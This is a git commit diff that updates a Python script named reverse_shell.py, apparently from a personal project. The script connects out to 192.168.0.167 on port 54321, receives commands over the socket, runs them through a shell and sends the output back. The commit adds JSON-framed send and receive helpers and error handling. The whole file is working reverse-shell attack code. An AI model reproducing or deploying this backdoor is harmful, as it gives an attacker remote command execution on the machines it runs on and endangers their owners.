070fb1f363ed6289836d09ad2a44b5f9a71d6654
Ranjan-Yadav <111560232+Rohit-YV@users.noreply.github.com>
2024-05-30 20:31:45 +0530

    Add files via upload

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,21 +1,38 @@
 #!/usr/bin/python
+
 import socket
 import subprocess
+import json
+
+def reliable_send(data):
+    json_data = json.dumps(data)
+    sock.send(json_data.encode())
+
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + sock.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == "q":
+            break
+        else:
+            try:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                reliable_send(result.decode())
+            except Exception as e:
+                reliable_send(f"[!!] Can't execute that command: {str(e)}")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("192.168.0.167", 54321))
 print("Connection established")
-
-while True:
-    command = sock.recv(1024)
-    if command == b"q":  
-        break
-    else:
-        proc = subprocess.Popen(
-            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
-        )
-        result = proc.stdout.read() + proc.stderr.read()
-        sock.send(result)
-
+shell()
 sock.close()
 
